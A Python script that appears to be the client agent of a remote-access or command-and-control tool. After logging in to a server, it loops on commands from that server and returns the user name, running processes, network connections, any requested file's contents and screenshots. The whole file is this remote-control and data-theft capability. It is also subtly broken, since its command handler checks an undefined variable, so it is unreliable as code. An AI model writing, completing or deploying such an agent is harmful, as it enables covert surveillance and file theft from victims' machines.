import socket
import json
import subprocess
import os
import psutil
import pyautogui
import io
import time
import base64

ip_server = '127.0.0.1' 
port_server = 22


def send_message(sock, message):
    
    try:
        result = message["result"]

        if type(result) == bytes:
            message["result"] = base64.b64encode(result).decode()
        
        message_bytes = json.dumps(message).encode()
        header = f"{len(message_bytes):<10}".encode()
        sock.sendall(header + message_bytes)
        return True
    except Exception as e:
        print(f"[x] Error sending message: {e}")
        return False
def recv_message(sock):
    header = b""
    while len(header) < 10:
        chunk = sock.recv(10 - len(header))
        if not chunk:
            return None
        header += chunk

    total_size = int(header.decode().strip())

    data = b""
    while len(data) < total_size:
        chunk = sock.recv(total_size - len(data))
        if not chunk:
            return None
        data += chunk

    return json.loads(data.decode())
def get_process_list():
    procs_str = f"{'PID':<10} {'Name':<30}\n"
    procs_str += "-" * 40 + "\n"
    
    count = 0
    for proc in psutil.process_iter(['pid', 'name']):
        if count >= 10: 
            break
        try:
            p_info = proc.info
            procs_str += f"{p_info['pid']:<10} {p_info['name']:<30}\n"
            count += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
            
    return procs_str.encode()
def get_screenshot_bytes():
    try:
        buffer = io.BytesIO()
        pyautogui.screenshot().save(buffer, format='PNG')
        return buffer.getvalue()
    except Exception as e:
        return f"Error taking screenshot: {e}".encode()
def send_ping(sock):
    send_message(sock, {"action": "ping"})

def get_whoami():

    try:
        output = subprocess.check_output("whoami", shell=True, stderr=subprocess.STDOUT)
            
        return output
            
    except Exception as e:
        return str(e).encode()
    
def get_file(file_path):
    try:
        if os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                return f.read() 
        else:
            return f"Error: File '{file_path}' not found.".encode()
    except Exception as e:
        return f"Error reading file: {e}".encode()
def get_network_connections():
    conn_str = f"{'Proto':<7} {'Local Address':<35} {'Remote Address':<35} {'Status':<15}\n"
    conn_str += "-" * 90 + "\n"
    
    try:
        connections = psutil.net_connections(kind='inet')
        
        for conn in connections[:15]: 
            proto = "TCP" if conn.type == socket.SOCK_STREAM else "UDP"
            
            l_addr = f"{conn.laddr.ip}:{conn.laddr.port}"
            
            if conn.raddr:
                r_addr = f"{conn.raddr.ip}:{conn.raddr.port}"
            else:
                r_addr = "N/A"
            
            conn_str += f"{proto:<7} {l_addr:<25} {r_addr:<25} {conn.status:<15}\n"
            
    except Exception as e:
        conn_str += f"Error: {e}\n"
        
    return conn_str.encode()
def handler_command(packet):
    task_id = packet["task_id"]
    command = packet["command"]

    if action == 'whoami':
        return get_whoami()
    elif action == 'tasklist':
        return get_process_list()
    elif action == 'netstat':
        return get_network_connections()
    elif action == 'getfile':
        file_path = command.get("path")
        if file_path:
            return get_file(file_path) 
        else:
            return b"Error: No file path provided."
    elif action == 'screenshot':
                return get_screenshot_bytes()
    else :
        return b"unknown command"
if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip_server, port_server))

        msg = recv_message(sock)
        print(f"Server says: {msg}")#Login or Create format
        choice = input("Your choice (Login/Create): ")
        
        name = input("Enter Name: ")
        password = input("Enter Password: ")
        payload = {"action":choice,"data":{"name":name,"password":password}}
        payload = json.dumps(payload)
        payload_bytes = payload.encode()
        header = f"{len(payload_bytes):<10}".encode()
        sock.send(header+payload_bytes)


        final_answer = recv_message(sock)  
        print(f"Final Status: {final_answer.get('status')}")
        agent_id = final_answer.get("agent_id")

        if final_answer.get("status").lower() == "success":   #after auth
            while True:

                command_server = recv_message(sock)#recv command from server
                print(command_server)
                result = handler_command(command_server)
                send_message(sock, {
                    "action": msg["action"],
                    "result": result
                })                


       
    except Exception as e:
        print(f"Connection error: {e}")
    finally:
        sock.close()